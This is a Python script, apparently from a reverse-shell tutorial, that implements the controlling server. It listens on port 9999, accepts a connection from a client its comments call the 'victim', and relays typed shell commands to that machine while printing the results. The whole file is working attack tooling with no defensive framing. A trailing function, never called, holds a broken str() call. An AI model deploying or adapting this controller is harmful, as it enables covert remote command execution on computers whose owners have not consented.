import socket
import sys

# Create a Socket (one endpoint of a two way communication btw computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
        print(s)
    except socket.error as msg:
        print(f'socket creation error: {str(msg)}')

# Binding the sockets and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print(f'binding the port: {str(port)}')
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(5) # 5 backlog - queue limit for connections
    except socket.error as msg:
        print(f'socket binding error: {str(msg)} , Retrying...')
        bind_socket()

# Establish connection with a client(socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print(conn)
    print(address)
    # IP address of client(victim)
    print(f'connection has been established! | IP: {address[0]} | Port: {str(address[1])}')
    send_commands(conn)
    conn.close()

# Send commands to client/victim or a friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            # you can send data in the form of bytes
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8')
            print(client_response, end='')

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()

def ab():
    print(str.encode('hi all!'))
    str('hi', 'utf-8')

